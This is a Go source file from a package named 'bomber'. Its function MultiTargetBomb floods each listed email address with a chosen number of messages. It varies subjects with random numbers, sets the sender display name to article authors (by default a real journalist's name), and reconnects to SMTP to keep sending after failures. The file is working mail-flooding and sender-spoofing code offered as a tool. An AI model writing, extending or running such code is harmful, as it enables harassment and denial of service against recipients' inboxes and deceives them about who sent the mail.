package bomber

import (
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/fatih/color"
	"gopkg.in/gomail.v2"
)

func MultiTargetBomb(articleChunks <-chan Article, emailChunks <-chan []string, wg *sync.WaitGroup, mutex *sync.Mutex, msgOptions *gomail.Message, smtpCreds SmtpOpts, numBombs int, smtpConn *SmtpConnOpts) {
	defer wg.Done()

	emailList := <-emailChunks
	for _, email := range emailList {
		pgBarDescription := fmt.Sprintf("%s ->", email)
		pgBar := MakePgBar(numBombs, pgBarDescription)
		for i := 0; i < numBombs; i++ {
			article := <-articleChunks
			if article.Author == "" {
				article.Author = "Fabrizio Romano"
			}
			rand.New(rand.NewSource(time.Now().UnixNano()))
			randomInt := rand.Intn(1000)
			randNum := strconv.Itoa(randomInt)
			subject := fmt.Sprintf("%s %s", article.Title, randNum)
			mutex.Lock()
			msgOptions.SetAddressHeader("From", smtpCreds.Username, article.Author)
			msgOptions.SetHeader("To", email)
			msgOptions.SetHeader("Subject", subject)
			msgOptions.SetBody("text/plain", article.Description)
			for {
				err := gomail.Send(smtpConn.Conn, msgOptions)
				if err == nil {
					pgBar.Add(1)
					smtpConn.NewConn = false
					break
				} else if err != nil && smtpConn.NewConn {
					color.New(color.FgRed).Printf("\nThe SMTP has been rate limited. Try again later!\n")
					os.Exit(1)
				} else {
					color.New(color.FgRed).Printf("\nerr: %v\n", err)
					color.New(color.FgGreen).Printf("\nusing a different Connection\n")
					conn, err := CreateSMTPConn(smtpCreds)
					if err != nil {
						color.New(color.FgRed).Printf("\nError creating a new SMTP connection!\n")
						os.Exit(1)
					} else {
						smtpConn.Conn = conn
						smtpConn.NewConn = true
					}

				}
			}
			mutex.Unlock()
		}
	}
}
